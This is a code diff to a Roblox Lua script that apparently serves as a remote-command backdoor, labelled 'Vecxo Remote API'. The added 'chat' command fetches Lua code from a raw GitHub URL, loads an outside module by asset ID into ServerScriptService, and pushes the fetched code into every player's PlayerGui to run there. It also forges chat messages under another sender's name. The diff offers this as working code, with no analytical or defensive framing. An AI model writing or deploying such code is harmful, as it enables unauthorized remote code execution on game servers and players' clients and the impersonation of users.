@@ -130,16 +130,43 @@ local function runCommand(cmd)
 
 	if text:sub(1, 5) == "chat " then
 		local msg = text:sub(6)
-		local fakeSender = sender or "Test"
-		local chatMsg = string.format("[%s]: %s", fakeSender, msg)
+		local HttpService = game:GetService("HttpService")
+		local code
+		local success, err = pcall(function()
+			code = HttpService:GetAsync("https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/RoChatAPI")
+		end)
 
-		if channel then
-			channel:DisplaySystemMessage(chatMsg)
-		else
-			warn("RBXGeneral channel not found")
+		if not success then
+			warn'http failed with chat api'
+			return
+		end
+
+		local formattedMessage = `{sender}: {msg}`
+		code = code:gsub('%[Vecko%]: asd', formattedMessage)
+
+		for i, plr in pairs(game.Players:GetPlayers()) do
+			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
+				local ticking = tick()
+				require(112354705578311).load()
+				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
+			end
+			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")
+			if not goog then
+				warn("goog failed to be added, command cannot continue")
+				return
+			end
+
+			local scr = goog:FindFirstChild("Utilities").Client:Clone()
+			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
+
+			loa.Parent = scr
+			scr:WaitForChild("Exec").Value = code
+			if plr.Character then
+				scr.Parent = plr:WaitForChild("PlayerGui")
+			end
+			scr.Enabled = true
 		end
 	end
-
 
 	if text:sub(1, 2) == "h " then
 		local msg = cmd.text:sub(3)
@@ -222,7 +249,7 @@ end)
 
 pcall(function()
 	local h = Instance.new('Hint', workspace)
-	h.Text = '[Vecxo Remote API] Connected as ' .. serverLabel
+	h.Text = '[Vecxo Remote API] Connected successfully'
 	task.wait(3)
 	h:Destroy()
 end)
